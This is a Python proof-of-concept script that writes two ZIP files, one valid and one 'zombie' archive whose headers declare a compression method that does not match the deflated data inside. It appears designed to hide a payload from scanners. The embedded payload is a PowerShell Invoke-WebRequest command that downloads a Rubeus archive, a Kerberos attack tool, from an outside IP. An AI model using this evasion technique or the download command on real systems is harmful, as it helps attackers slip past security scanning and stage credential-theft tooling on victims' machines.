#!/usr/bin/env python3

import struct
import zlib
import os

IWR = b'Invoke-WebRequest -Uri "http://192.168.41.125:9000/Rubeus.zip.b64" -Outfile "C:/Users/DEINF.S-ETIR3/Desktop/Offensive/Zombie-zip-PoC/zombie-zip"'

def crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xffffffff

def raw_deflate(data: bytes) -> bytes:
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    return compressor.compress(data) + compressor.flush()

def make_valid_zip(filename: str, payload: bytes, payload_name: str = "IWR.com") -> int:
    compressed = raw_deflate(payload)
    name_bytes = payload_name.encode()
    
    local = struct.pack('<IHHHHHIIIHH',
        0x04034b50,
        20,
        0,
        8,
        0, 0,
        crc32(payload),
        len(compressed),
        len(payload),
        len(name_bytes),
        0
    )
    
    cd = struct.pack('<IHHHHHHIIIHHHHHII',
        0x02014b50,
        20,
        20,
        0,
        8,
        0, 0,
        crc32(payload),
        len(compressed),
        len(payload),
        len(name_bytes),
        0, 0, 0, 0, 0,
        0
    )
    
    cd_offset = len(local) + len(name_bytes) + len(compressed)
    cd_size = len(cd) + len(name_bytes)
    
    eocd = struct.pack('<IHHHHIIH',
        0x06054b50,
        0, 0,
        1, 1,
        cd_size,
        cd_offset,
        0
    )
    
    with open(filename, 'wb') as f:
        f.write(local + name_bytes + compressed + cd + name_bytes + eocd)
    
    return os.path.getsize(filename)

def make_zombie_zip(filename: str, payload: bytes, payload_name: str = "IWR.com") -> int:
    compressed = raw_deflate(payload)
    name_bytes = payload_name.encode()
    
    local = struct.pack('<IHHHHHIIIHH',
        0x04034b50,
        20,
        0,
        0,
        0, 0,
        crc32(payload),
        len(compressed),
        len(payload),
        len(name_bytes),
        0
    )
    
    cd = struct.pack('<IHHHHHHIIIHHHHHII',
        0x02014b50,
        20,
        20,
        0,
        0,
        0, 0,
        crc32(payload),
        len(compressed),
        len(payload),
        len(name_bytes),
        0, 0, 0, 0, 0,
        0
    )
    
    cd_offset = len(local) + len(name_bytes) + len(compressed)
    cd_size = len(cd) + len(name_bytes)
    
    eocd = struct.pack('<IHHHHIIH',
        0x06054b50,
        0, 0,
        1, 1,
        cd_size,
        cd_offset,
        0
    )
    
    with open(filename, 'wb') as f:
        f.write(local + name_bytes + compressed + cd + name_bytes + eocd)
    
    return os.path.getsize(filename)

def main():
    make_valid_zip("baseline_iwr.zip", IWR)
    make_zombie_zip("method_mismatch_iwr.zip", IWR)

if __name__ == "__main__":
    main()